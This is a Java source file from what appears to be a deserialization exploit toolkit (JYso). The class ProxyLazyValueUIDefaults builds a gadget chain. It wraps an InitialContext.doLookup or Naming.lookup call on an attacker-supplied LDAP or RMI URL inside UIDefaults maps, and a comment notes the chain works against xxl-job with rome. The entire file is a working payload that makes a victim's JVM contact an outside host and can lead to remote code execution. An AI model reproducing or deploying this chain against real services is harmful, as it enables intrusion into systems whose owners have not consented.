package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;

import javax.swing.*;

public class ProxyLazyValueUIDefaults implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        // xxl-job rome 可用链 UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue(className, methodName, params);
        UIDefaults.ProxyLazyValue proxyLazyValue;
        if (command.startsWith("rmi17")) {
            command = command.replace("rmi17", "rmi");
            // jdk 8不存在java.rmi.Naming这个类，jdk17中存在
            proxyLazyValue = new UIDefaults.ProxyLazyValue("java.rmi.Naming", "lookup", new Object[]{command});
        } else if (command.startsWith("ldap") || command.startsWith("rmi")) {
            proxyLazyValue = new UIDefaults.ProxyLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{command});
        } else {
            proxyLazyValue = new UIDefaults.ProxyLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{command});
        }
        // UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("javax.naming.InitialContext", "doLookup", new String[]{command});
        Reflections.setFieldValue(proxyLazyValue, "acc", null);
        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", proxyLazyValue);
        u2.put("aaa", proxyLazyValue);
        return Gadgets.maskmapToString(u1, u2);
    }
}
